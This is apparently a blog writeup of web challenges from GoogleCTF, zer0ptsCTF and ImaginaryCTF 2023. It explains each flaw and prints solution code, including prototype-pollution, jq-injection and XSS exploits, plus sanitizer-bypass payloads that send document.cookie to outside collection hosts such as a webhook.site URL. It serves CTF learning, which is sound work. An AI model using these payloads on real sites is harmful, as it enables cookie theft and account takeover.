---
title: GoogleCTF + zer0ptsCTF + ImaginaryCTF 2023 Writeup
catalog: true
date: 2023-07-28 14:10:44
tags: [Security]
categories: [Security]
photos: /img/google-zer0pts-imaginary-ctf-2023-writeup/cover.png
---

A while ago, I was busy traveling and didn't have much time for CTFs. Even if I did participate, I was too lazy to write a writeup, so my last writeup was back in March. I felt it was a shame to break the streak, so I quickly wrote another one to make up for it.

Regarding the three CTFs mentioned in the title, I only participated in GoogleCTF 2023. For the other two events, I only briefly looked at the challenges, so this post will only serve as a note on the challenges and their solutions.

Keyword list:

1. Inconsistent order of POST data parsing between Flask and PHP
2. iframe CSP blocking certain script loads
3. CSRF bypass using HEAD method
4. Accessing parent origin using `location.ancestorOrigins`
5. Changing iframe location doesn't affect the src
6. Angular CSP bypass gadget in recaptcha URL
7. Restoring input using `document.execCommand('undo');`
8. X-HTTP-Method-Override
9. Differences between HTML and XHTML parsers

<!-- more -->

## GoogleCTF 2023

Here is the complete official challenge content and solution: [https://github.com/google/google-ctf/tree/master/2023](https://github.com/google/google-ctf/tree/master/2023)

### UNDER-CONSTRUCTION (466 solves)

The core code for this challenge is as follows:

``` python
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    username = request.form.get('username')
    password = request.form.get('password')
    tier = models.Tier(request.form.get('tier'))

    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))

    if(len(username) > 15 or len(username) < 4):
        flash('Username length must be between 4 and 15')
        return redirect(url_for('authorized.signup'))

    user = models.User.query.filter_by(username=username).first()

    if user:
        flash('Username address already exists')
        return redirect(url_for('authorized.signup'))

    new_user = models.User(username=username, 
        password=generate_password_hash(password, method='sha256'), tier=tier.name)

    db.session.add(new_user)
    db.session.commit()

    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))
```

There is a registration feature that checks the parameters in the data. After the check, the request is forwarded to PHP. Our goal is to create a user with a tier of GOLD.

The solution exploits the inconsistency in POST data parsing between PHP and Flask. If we pass `a=1&a=2`, Flask will retrieve `1` (the first one) for the parameter `a`, while PHP will retrieve `2` (the last one).

Therefore, by leveraging this inconsistency, we can create a legitimate user in Flask with the tier set to GOLD when forwarding the request to PHP:

```
curl -X POST http://<flask-challenge>/signup -d "username=username&password=password&tier=blue&tier=gold"
```

### BIOHAZARD (14 solves)

This challenge allows you to create a note, and the goal is to perform an XSS attack.

During the rendering of the note, there is a prototype pollution vulnerability. The rendering process first sanitizes the input:

``` js
goog.require('goog.dom');
goog.require('goog.dom.safe');
goog.require('goog.html.sanitizer.unsafe');
goog.require('goog.html.sanitizer.HtmlSanitizer.Builder');
goog.require('goog.string.Const');

window.addEventListener('DOMContentLoaded', () => {
  var Const = goog.string.Const;
  var unsafe = goog.html.sanitizer.unsafe;
  var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
  builder = unsafe.alsoAllowTags(
      Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']);
  sanitizer = unsafe.alsoAllowAttributes(
      Const.from('iframe#src is required for Youtube embed'), builder,
      [
        {
        tagName: 'iframe',
        attributeName: 'src',
        policy: (s) => s.startsWith('https://') ? s : '',
        }
      ]).build();
});

setInnerHTML = function(elem, html) {
  goog.dom.safe.setInnerHtml(elem, html);
}
```

This sanitizer can be bypassed partially through prototype pollution. You cannot use new tags, but you can bypass attribute restrictions. For example, iframes are allowed, so you can use iframe srcdoc.

There is a complication with the CSP: `base-uri 'none'; script-src 'nonce-${nonce}' 'strict-dynamic' 'unsafe-eval'; require-trusted-types-for 'script';`. It includes trusted types, so even though you can inject `<img src=x onerror=alert(1)>`, the underlying sanitizer triggers a trusted types error when executing `img.setAttribute('onerror','alert(1)')`, causing the attack to fail.

I struggled for a while to bypass this restriction. Eventually, I had the idea that there are test HTML files under the static folder. If any of those files have an XSS vulnerability, we can simply use an iframe src to obtain the flag. I did some searching at the time but couldn't find any suitable file. However, after the competition, I saw that someone did manage to solve it using this file: [https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html](https://github.com/shhnjk/closure-library/blob/master/closure/goog/demos/xpc/minimal/index.html)

Later, I realized that the way it loads JavaScript is like this:

``` html
<script src="/static/closure-library/closure/goog/base.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/bootstrap.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/sanitizer.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
<script src="/static/main.js" nonce="i8OeY0yF3xOOTZVZHHBqIg=="></script>
```

There is a variable called `editor` defined in `bootstrap.js`, which is then loaded as a script src in `main.js`. If we block the loading of `bootstrap.js` using iframe csp and then combine it with polluting `Object.prototype.editor`, we can load any JS.

And this is indeed the intended solution.

I learned this trick in the [Intigriti’s November XSS challenge](https://github.com/aszx87410/ctf-writeups/issues/48), where CSP was tightened to prevent the loading of certain scripts.

### VEGGIE SODA (13 solves)

During the competition, one of my teammates solved this completely without my help.

After the competition, I looked at the official solution. The first level bypasses CSRF protection using HEAD, which seems to be a commonly used technique. The second level looks similar to last year's [HORKOS](https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves), involving JS deserialization vulnerability. Once a gadget chain is found, XSS can be achieved.

Here is the link to the official solution: https://github.com/google/google-ctf/tree/master/2023/web-vegsoda

### POSTVIEWER V2 (7 solves)

This challenge is the reason why I kept avoiding writing a writeup. It's like the movie Inception, with layer upon layer, so complex that I didn't even know what I was doing towards the end.

Although it's called V2, it's quite different from last year's challenge.

Let's focus on this part:

``` js
async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) {
    const url = new URL(shimUrl);
    url.host = `sbx-${generateRandomPart()}.${url.host}`;
    url.searchParams.set('o', window.origin);

    var iframe = document.createElement('iframe');
    iframe.src = url;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType, sandbox}, url.origin);
    }, { once: true });
}
```

Here, a random sbx domain iframe is added, and the flag is passed through postMessage. The content of this sbx domain is also simple:

``` js
const TRUSTED_ORIGIN = new URL(location.href).searchParams.get('o');
if(!/^https?:\/\//.test(TRUSTED_ORIGIN)) {
    throw new Error("Untrusted Origin");
}else{
    const DEFAULT_STYLE = 'position:absolute; top:0; left:0; bottom:0; right:0; width:100vw; height:100vh; border:none; margin:0; padding:0; z-index:999999;'
    window.onmessage = (e) => {
        const forbidden_sbx = /allow-same-origin/ig;
        if(e.origin !== TRUSTED_ORIGIN){
            throw new Error("Wrong origin");
        }
        if (e.data.body === undefined || !e.data.mimeType) {
            throw new Error("No content to render");
        };
    
        const blob = new Blob([e.data.body], {
            type: e.data.mimeType
        });

        const iframe = document.createElement('iframe');
        iframe.style.cssText = DEFAULT_STYLE;
        document.body.appendChild(iframe);
        iframe.setAttribute('sandbox', '');

        if(e.data.sandbox){
            for(const value of e.data.sandbox){
                if(forbidden_sbx.test(value) || !iframe.sandbox.supports(value)){
                    console.error(`Unsupported value: ${value}`);
                    continue;
                }
                iframe.sandbox.add(value);
            }
        }
        
        iframe.src = URL.createObjectURL(blob);
        document.body.appendChild(iframe);
        window.onmessage = null;
        e.source.postMessage('blob loaded', e.origin);
    };
}
```

The received content is turned into a blob and then placed in a sandbox iframe. Our goal is to steal the content inside this iframe.

There are a few troublesome points:

1. The admin bot has restrictions. We cannot open new windows, and any functionality similar to `window.open` is not allowed.
2. The CSP of the main domain is: `frame-ancestors *.postviewer2-web.2023.ctfcompetition.com; frame-src *.postviewer2-web.2023.ctfcompetition.com`
3. The CSP of the sbx domain is: `frame-src blob:`

Firstly, we can easily obtain XSS on any sbx domain, like this:

``` js
iframe = document.createElement("iframe")
url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
url.searchParams.set('o', window.origin);
iframe.src = url

iframe.addEventListener('load', () => {
    iframe.contentWindow.postMessage({body:"<script>alert(document.domain)</script>", mimeType: "text/html", sandbox: ["allow-modals","allow-scripts",["allow-same-origin"],["allow-same-origin"]]}, "*")
}, { once: true });
document.body.appendChild(iframe);
```

Now, the question is, what can we do next?

Our first step should be finding a way to bring the main domain into an iframe to perform further operations. However, the sbx domain only allows embedding pages starting with `blob:`, so how do we proceed?

At this point, we thought of using a cookie bomb to make the sbx domain return `HTTP/2 413 Request Entity Too Large`, which would remove the CSP error page.

The process is as follows:

1. Load our own webpage first.
2. Embed an sbx iframe to obtain XSS.
3. Write a cookie from the sbx iframe to prevent loading of the /bomb path.
4. Add another iframe with /bomb, which has no CSP.
5. From the iframe in step 2, directly modify the content of the iframe in step 4 to obtain an XSS without CSP.
6. Now we can embed the main domain inside the iframe.

Steps 1 to 5 are correct, but step 6 is incorrect. Although there is no longer the restriction of `frame-src blob:`, the `frame-ancestors *.postviewer2-web.2023.ctfcompetition.com;` of the main domain refers to all parent pages. So, as long as our top-level page is our own, we cannot bypass the CSP.

Then I suddenly thought of using a blob, like this:

``` js
const blob = new Blob(['<h1>hello</h1><iframe src="http://127.0.0.1:5000/test"></iframe>'], {
    type: 'text/html'
});
url = URL.createObjectURL(blob)
console.log(url)
location = url
```

This way, the top-level domain becomes `sbx-xxx.postviewer2-web.2023.ctfcompetition.com`, which satisfies the CSP.

However, an error occurred during the attempt:

> Unsafe attempt to initiate navigation for frame with origin 'http://localhost:3000/' from frame with URL 'blob:https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/a15c526d-a65b-45ba-b99f-293595eb8818'. The frame attempting to navigate the top-level window is cross-origin and either it or one of its ancestors is not allowed to navigate the top frame.

Later, my teammate found that adding the sandbox attribute to the iframe resolved the issue: `frame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'`. This behavior is worth recording because I thought that not having the sandbox attribute would provide more permissions, but it turns out that adding the sandbox attribute is necessary.

So the updated process is as follows:

1. Load our own webpage first.
2. Embed an sbx iframe (f1) to obtain XSS.
3. Write a cookie from frame1 to prevent loading the /bomb path.
4. Add another iframe for /bomb (f2) without CSP.
5. Add another iframe (f3) for executing operations.
6. Modify the HTML of f2 from f3, where the script written will add a blob HTML and then change the top.location.
7. Successfully load the blob without any CSP.
8. Load the main domain iframe on the blob page.

At this point, the exploit has already reached 100 lines and is extremely complex:

``` html
<body></body>
<script>
  const sleep = ms => new Promise(r => setTimeout(r, ms))

  function createBombFrame() {

    let bombFrame = document.createElement("iframe")
    url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
    url.searchParams.set('o', window.origin);
    bombFrame.src = url

    bombFrame.addEventListener('load', () => {
      console.log('bombFrame created')
      bombFrame.contentWindow.postMessage({
        body: `
          <script>
            const domain = document.domain
            const cookieCount = 10
            const cookieLength = 3000
            const expireAfterMinute = 5
            setCookieBomb()

            function setCookie(key, value) {
              const expires = new Date(+new Date() + expireAfterMinute * 60 * 1000);
              const v = key + '=' + value + '; path=/bomb; domain=' + domain + '; Secure; SameSite=None; expires=' + expires.toUTCString()
              parent.document.cookie = v
            }

            function setCookieBomb() {
              const value = 'Boring' + '_'.repeat(cookieLength)
              for (let i=0; i<cookieCount; i++) {
                setCookie('key' + i, value);
              }
            }
          <\/script>`,
        mimeType: "text/html", sandbox: ["allow-modals", "allow-scripts", ["allow-same-origin"], ["allow-same-origin"]]
      }, "*")
    }, { once: true });
    document.body.appendChild(bombFrame)
  }

  function createBrokenFrame() {
    return new Promise(resolve => {
      let brokenFrame = document.createElement("iframe")
      url = 'https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/bomb'
      brokenFrame.src = url
      brokenFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'
      brokenFrame.addEventListener('load', () => {
        console.log('brokenFrame loaded')
        resolve()
      }, { once: true });
      brokenFrame.addEventListener('error', (e) => {
        console.log('brokenFrame error', e)
        resolve()
      }, { once: true });
      document.body.appendChild(brokenFrame)
    })
  }

  function createXssFrame() {
    console.log('createXssFrame')
    window.xssFrame = document.createElement("iframe")
    url = new URL("https://sbx-gggg.postviewer2-web.2023.ctfcompetition.com/shim.html");
    url.searchParams.set('o', window.origin);
    xssFrame.src = url
    xssFrame.sandbox = 'allow-modals allow-scripts allow-top-navigation allow-same-origin'
    xssFrame.name = `
            const blob = new Blob(['<html><head><script src="YOUR PAYLOAD HERE" /><script>alert(1)</scr' + 'ipt></head><body><div /></body></html>'], {
                type: 'text/html'
            });
            url = URL.createObjectURL(blob)
            console.log(url)
            window.top.location = url
    `;

    xssFrame.addEventListener('load', () => {
      console.log('xss frame loaded')

      window.xssFrame.contentWindow.postMessage({
        body: `
          <script>
            top.frames[1].document.open()
            console.log('writing');
            console.log('<script>' + window.parent.name + '</scr' + 'ipt>');
            top.frames[1].document.write('<script>' + window.parent.name + '</scr' + 'ipt>')
          <\/script>`, mimeType: "text/html", sandbox: ["allow-modals", "allow-scripts", "allow-top-navigation", ["allow-same-origin"], ["allow-same-origin"]]
      }, "*")
    }, { once: true });
    document.body.appendChild(xssFrame)
  }

  async function main() {
    createBombFrame()
    console.log("sleeping")
    await sleep(2000)
    console.log("creating broken frame")
    await createBrokenFrame()
    createXssFrame()
  }

  window.addEventListener('message', e => {
    console.log('got message', e, window.location.toString());
  })

  window.addEventListener('load', () => {
    main();
  })
</script>
```

The main purpose of doing all these steps is just to load the main domain as an iframe, that's it.

However, we encountered a roadblock and couldn't bypass this part:

``` js
async function previewIframe(body, mimeType, shimUrl, container, sandbox = ['allow-scripts']) {
    const url = new URL(shimUrl);
    url.host = `sbx-${generateRandomPart()}.${url.host}`;
    url.searchParams.set('o', window.origin);

    var iframe = document.createElement('iframe');
    iframe.src = url;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType, sandbox}, url.origin);
    }, { once: true });
}
```

We don't know what the random domain is, so we can't use postMessage as it will be blocked. It would be easier if we knew the random domain.

We searched through various specifications, looked at Chromium source code and bug tracker, but made little progress. The closest we found was this: [Issue 1359122: Security: SOP bypass leaks navigation history of iframe from other subdomain if location changed to about:blank](https://bugs.chromium.org/p/chromium/issues/detail?id=1359122&q=subdomain%20host%20leak&can=1), which is what we needed, but it has already been fixed.

Just ten minutes before the end of the competition, my teammate found the [location.ancestorOrigins](https://developer.mozilla.org/en-US/docs/Web/API/Location/ancestorOrigins) property, and I realized that the child iframe can access the ancestor's origin, which I had never noticed before (even though it's the first property of the location object...).

Due to time constraints, we couldn't complete it in the end, only a few steps were left.

The next step is to redirect the iframe with the flag to our prepared blob page, which can leak the sandbox domain using `location.ancestorOrigins`:

```js
top[0][0][0].location = URL.createObjectURL(new Blob(['<script>top.postMessage(location.ancestorOrigins[0],"*")<\/script>'], { type: 'text/html' }));
```

Once we have the sandbox domain, we can obtain XSS on this domain. After obtaining XSS, we can access the sandbox domain. Although the location of the iframe has changed, the src of the iframe remains the same, so we can directly access the blob src with the flag. After that, we just need to fetch it to obtain the flag.

``` js
fetch(top[0][0].document.querySelector('iframe').src)
```

It could have been done in just a few hours initially, what a pity.

Here is the author's exploit, worth learning: [https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html](https://github.com/google/google-ctf/blob/master/2023/web-postviewer2/solution/solve.html)

### NOTENINJA (3 solves)

Basically, you can insert any HTML in this challenge, but the key point is the CSP: `script-src 'self' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/;`

Initially, I thought this challenge used Next.js and would be similar to the approach used in [corCTF 2022](https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/). However, I tried for a long time but couldn't figure it out. Only after the competition did I realize that this challenge was just about finding the CSP gadget for recaptcha...

Inside the recaptcha website, there is an Angular that can be used as a gadget. So the final solution is:

``` html
++++++++++++++++++++++++++++++++++++++
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
++++++++++++++++++++++++++++++++++++++
```

It's also a less-known CSP bypass that I learned.

Also, another team found a Mongoose 0day vulnerability: [Mongoose Prototype Pollution Vulnerability in automattic/mongoose](https://huntr.dev/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/)

The reason is in this line of code: [https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74](https://github.com/google/google-ctf/blob/master/2023/web-noteninja/challenge/src/pages/api/notes/%5Bid%5D.js#L74)

``` js
await Note.findByIdAndUpdate(id, { ...req.body, htmlDescription: htmlDescription });
```

It directly takes in the entire body, and then you can create a prototype pollution through `$rename`:

``` js
import { connect, model, Schema } from 'mongoose';

await connect('mongodb://127.0.0.1:27017/exploit');

const Example = model('Example', new Schema({ hello: String }));

const example = await new Example({ hello: 'world!' }).save();
await Example.findByIdAndUpdate(example._id, {
    $rename: {
        hello: '__proto__.polluted'
    }
});

// this is what causes the pollution
await Example.find();

const test = {};
console.log(test.polluted); // world!
console.log(Object.prototype); // [Object: null prototype] { polluted: 'world!' }

process.exit();
```

With this prototype pollution vulnerability, you can use `find()` to dump all the data and see other people's notes.

## zer0ptsCTF 2023

Let me provide a few references first:

1. [zer0pts CTF writeup (in English)](https://nanimokangaeteinai.hateblo.jp/entry/2023/07/17/101119)
2. [zer0pts CTF 2023 writeup (4 web challs)](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/)
3. [zer0pts CTF 2023 Writeups](https://blog.maple3142.net/2023/07/16/zer0pts-ctf-2023-writeups/)

The complete code for each challenge is available here: [https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web](https://github.com/zer0pts/zer0pts-ctf-2023-public/tree/master/web)

### Warmuprofile (48 solves)

This challenge is quite interesting. You can add and delete users, and the goal is to create an admin user. However, the admin user already exists, so you need to find a way to delete it.

The code for deletion is as follows:

``` js
app.post('/user/:username/delete', needAuth, async (req, res) => {
    const { username } = req.params;
    const { username: loggedInUsername } = req.session;
    if (loggedInUsername !== 'admin' && loggedInUsername !== username) {
        flash(req, 'general user can only delete itself');
        return res.redirect('/');
    }

    // find user to be deleted
    const user = await User.findOne({
        where: { username }
    });

    await User.destroy({
        where: { ...user?.dataValues }
    });

    // user is deleted, so session should be logged out
    req.session.destroy();
    return res.redirect('/');
});
```

If you look closely and think about it, you will notice a problem here.

The problem is that if you log in with two tabs at the same time, both sessions will have a username. Then, if you delete a user on one page and perform the same operation on the other page after deletion, `User.findOne` will return `null` because the user no longer exists in the database. When it reaches `User.destroy`, it becomes `where: {}`, which deletes everything in the database, including the admin.

### jqi (40 solves)

In this challenge, you can execute corresponding jq commands based on the conditions you set. It was through this challenge that I discovered the many functionalities of jq.

The main code is this part:

``` js
const KEYS = ['name', 'tags', 'author', 'flag'];
fastify.get('/api/search', async (request, reply) => {
    const keys = 'keys' in request.query ? request.query.keys.toString().split(',') : KEYS;
    const conds = 'conds' in request.query ? request.query.conds.toString().split(',') : [];

    if (keys.length > 10 || conds.length > 10) {
        return reply.send({ error: 'invalid key or cond' });
    }

    // build query for selecting keys
    for (const key of keys) {
        if (!KEYS.includes(key)) {
            return reply.send({ error: 'invalid key' });
        }
    }
    const keysQuery = keys.map(key => {
        return `${key}:.${key}`
    }).join(',');

    // build query for filtering results
    let condsQuery = '';

    for (const cond of conds) {
        const [str, key] = cond.split(' in ');
        if (!KEYS.includes(key)) {
            return reply.send({ error: 'invalid key' });
        }

        // check if the query is trying to break string literal
        if (str.includes('"') || str.includes('\\(')) {
            return reply.send({ error: 'hacking attempt detected' });
        }

        condsQuery += `| select(.${key} | contains("${str}"))`;
    }

    let query = `[.challenges[] ${condsQuery} | {${keysQuery}}]`;
    console.log('[+] keys:', keys);
    console.log('[+] conds:', conds);
    console.log(query)

    let result;
    try {
        result = await jq.run(query, './data.json', { output: 'json' });
    } catch(e) {
        console.log(e)
        return reply.send({ error: 'something wrong' });
    }

    if (conds.length > 0) {
        reply.send({ error: 'sorry, you cannot use filters in demo version' });
    } else {
        reply.send(result);
    }
});
```

Although double quotation marks are blocked, the backslash `\` is not blocked. Therefore, by combining two conditions, you can insert your own jq command and achieve command injection. You can retrieve the flag using `env.FLAG`.

However, the problem is that the result is not returned, so it is a blind injection. You need to leak one character at a time. Below is the exploit from the [zer0pts CTF 2023 writeup (4 web challs)](https://blog.arkark.dev/2023/07/17/zer0pts-ctf/):

``` js
import httpx
import string

# BASE_URL = "http://localhost:8300"
BASE_URL = "http://jqi.2023.zer0pts.com:8300"

CHARS = "}_" + string.ascii_letters + string.digits


def make_str(xs: str) -> str:
    return "(" + "+".join([f"([{ord(x)}] | implode)" for x in xs]) + ")"


def is_ok(prefix: str) -> bool:
    res = httpx.get(
        f"{BASE_URL}/api/search",
        params={
            "keys": "name",
            "conds": ",".join([
                "\\ in name",
                f"))] + [if (env.FLAG | startswith({make_str(prefix)})) then error({make_str('x')}) else 0 end] # in name"
            ]),
        },
    )
    return res.json()["error"] == "something wrong"


known = "zer0pts{"
while not known.endswith("}"):
    for c in CHARS:
        if is_ok(known + c):
            known += c
            break
    print(known)
print("Flag: " + known)
```

### Neko Note (26 solves)

This is another classic note app. The core code is as follows:

``` go
var linkPattern = regexp.MustCompile(`\[([0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12})\]`)

// replace [(note ID)] to links
func replaceLinks(note string) string {
  return linkPattern.ReplaceAllStringFunc(note, func(s string) string {
    id := strings.Trim(s, "[]")

    note, ok := notes[id]
    if !ok {
      return s
    }

    title := html.EscapeString(note.Title)
    return fmt.Sprintf(
      "<a href=/note/%s title=%s>%s</a>", id, title, title,
    )
  })
}

// escape note to prevent XSS first, then replace newlines to <br> and render links
func renderNote(note string) string {
  note = html.EscapeString(note)
  note = strings.ReplaceAll(note, "\n", "<br>")
  note = replaceLinks(note)
  return note
}
```

After sanitization, the link will be replaced. Although there is also escaping here, because the attribute is not enclosed in quotes, arbitrary attributes can be injected into the `a` tag.

Here, triggering XSS seems possible with `onanimationend` or `onfocus`.

After triggering XSS, there is another step, which is that the stolen information is deleted. However, you can use the magical `document.execCommand('undo');` to restore it.

### ScoreShare (16 solves)

The core code for this challenge is as follows:

``` python
@app.route("/", methods=['GET', 'POST'])
def upload():
    if flask.request.method == 'POST':
        title = flask.request.form.get('title', '')
        abc = flask.request.form.get('abc', None)
        link = flask.request.form.get('link', '')
        if not title:
            flask.flash('Title is empty')
        elif not abc:
            flask.flash('ABC notation is empty')
        else:
            sid = os.urandom(16).hex()
            db().hset(sid, 'title', title)
            db().hset(sid, 'abc', abc)
            db().hset(sid, 'link', link)
            return flask.redirect(flask.url_for('score', sid=sid))
    return flask.render_template("upload.html")

@app.route("/score/<sid>")
def score(sid: str):
    """Score viewer"""
    title = db().hget(sid, 'title')
    link = db().hget(sid, 'link')
    if link is None:
        flask.flash("Score not found")
        return flask.redirect(flask.url_for('upload'))
    return flask.render_template("score.html", sid=sid, link=link.decode(), title=title.decode())

@app.route("/api/score/<sid>")
def api_score(sid: str):
    abc = db().hget(sid, 'abc')
    if abc is None:
        return flask.abort(404)
    else:
        return flask.Response(abc)
```

You can add a post or something similar, and there is an unintended endpoint `/api/score/<sid>` that directly outputs the entire `abc`. So, by adding two posts, one with JS content and the other with `<script src=...>`, you can directly perform XSS.

The expected solution can be found in the author's article: [zer0pts CTF 2023 Writeup](https://ptr-yudai.hatenablog.com/#ScoreShare). By using iframe DOM clobbering and combining it with the existing functionality, prototype pollution can be achieved, and then the gadget for ABCJS can be found.

### Ringtone (14 solves)

This challenge is a bit complicated, so I'll briefly summarize it. You can obtain an XSS in the Chrome extension context through DOM clobbering. Then, using `chrome.history.search`, you can retrieve the flag URL and obtain the flag.

Author's writeup: [Ringtone Web Challenge Writeup - Zer0pts CTF 2023](https://ahmed-belkahla.me/post/zer0ptsctf2023/)

### Plain Blog (14 solves)

This challenge is a blog app. You need permission to retrieve the flag, and to have this permission, your post must have more than 1_000_000_000_000 likes. However, it is clear that the website blocks the maximum number of likes, so it is impossible to reach such a high number.

The solution lies in a frontend prototype pollution vulnerability. By exploiting this vulnerability, you can contaminate the parameters of the fetch request and include the `X-HTTP-Method-Override: PUT` header, allowing the admin bot to directly call another API and obtain the permission.

## ImaginaryCTF 2023

### Sanitized (5 solves)

The code for this challenge is quite short, and one thing worth noting is that the CSP is set to `default-src 'self'`. Additionally, there is a path in Express:

``` js
app.use((req, res) => {
  res.type('text').send(`Page ${req.path} not found`)
})
```

It can be seen that the response from this path needs to be used as a script to execute.

On the frontend side, it is a classic call to DOMPurify:

``` js
const params = new URLSearchParams(location.search)
const html = params.get('html')
if (html) {
  document.getElementById('html').value = html
  document.getElementById('display').innerHTML = DOMPurify.sanitize(html)
}
```

When loading `main.js` in `index.xhtml`, it uses a relative path: `<script src="main.js"></script>`.

Let's first look at the unintended solution, which is quite interesting.

The unintended solution is to make the bot load this path: `/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//asd%2f..%2f..%2findex.xhtml#https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?`

This exploits RPO (Relative Path Overwrite) to cause mischief. For the backend, `%2f` is interpreted as `/`, so this URL loads `index.xhtml` without any issues.

However, for the browser, the current path becomes `1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//`, so it will load `/1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js`. According to Express's route, the response will be:

```
Page /1;var[Page]=[1];location=location.hash.slice(1)+document.cookie//main.js not found
```

The first line `Page /1` does not throw a "variable is not defined" error because of the hoisting of `var [Page]=[1]`, and the last line `main.js not found` is turned into a comment by the preceding `//`, so the middle part is executed, and the cookie is stolen.

This operation is really cool.

### Sanitized Revenge (3 solves)

This question fixes the unintended behavior, so let's take a look at the expected solution.

First and foremost, the important point of this question is that the webpage is xhtml, not html, so the browser's parsing behavior will be different.

For example, the payload provided by the author:

``` html
<div><div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div><style><![CDATA[</style><div data-x="]]></style><iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
```

will be parsed by the HTML parser as a style tag + a div with the `data-x` attribute, so DOMPurify won't do anything, and this is valid HTML.

But because we are in xhtml, the CDATA part becomes something that looks like a comment, so after removing it, it becomes:

``` html
<div>
  <div id="url">https://webhook.site/65c71cbd-c78a-4467-8a5f-0a3add03e750?</div>
  <style></style>
  <iframe name='Page' /><base href='/**/+location.assign(document.all.url.textContent+document.cookie)//' /><style><!--"></div><style>--></style></div>
```

The iframe and base that were originally inside the attribute come out.

We need the base because when we encounter CSP like `script-src 'self'`, the first instinct is to use `<iframe srcdoc>` with a script gadget to bypass it. However, in this question, due to the limitation of xhtml, `<` cannot be present in attributes, so we need to use the upcoming `report.js` together with base to change the path.

In the [author's writeup](https://github.com/maple3142/My-CTF-Challenges/tree/master/ImaginaryCTF%202023/Sanitized%20Revenge), there are several other solutions given, each of which is quite interesting.

The first one takes advantage of the fact that HTML ignores `<!--` inside style tags, but xhtml doesn't, to create a difference:

``` html
<body>
<style>a { color: <!--}</style>
<img alt="--></style><base href='/(document.location=/http:/.source.concat(String.fromCharCode(47)).concat(String.fromCharCode(47)).concat(/cb6c5dql.requestrepo.com/.source).concat(String.fromCharCode(47)).concat(document.cookie));var[Page]=[1]//x/' />">
</body>
```

The second one exploits the fact that DOMPurify checks for valid HTML tags when detecting mXSS, which need to be ASCII alphanumeric, but XML actually allows more characters:

``` html
a<style><ø:base id="giotino" xmlns:ø="http://www.w3.org/1999/xhtml" href="/**/=1;alert(document.cookie);//" /></style>
```

So it's fine in an HTML context, but in xhtml, it will still be parsed as a base tag.

The third one looks similar to the first one, but the first one is much simpler. It goes like this:

``` html
ff<style><!--</style><a id="--><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base><!--"></a><style>&lt;k</style><style>--></style>
```

In HTML, it's just a style tag + an a tag + two style tags. But in xhtml, the `<!-- -->` inside the style is also considered a comment, so it becomes:

``` html
ff<style><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base></style>
```

From the desired effect he wants to achieve, it seems that it can be simplified like this:

``` html
ff<style><!--</style><a id="--><base href='/**/;var/**/Page;window.name=document.cookie;document.location.host=IPV4_ADDRESS_IN_INTEGER_FORM_REDACTED//'></base><!--"></a><style>--></style>
```
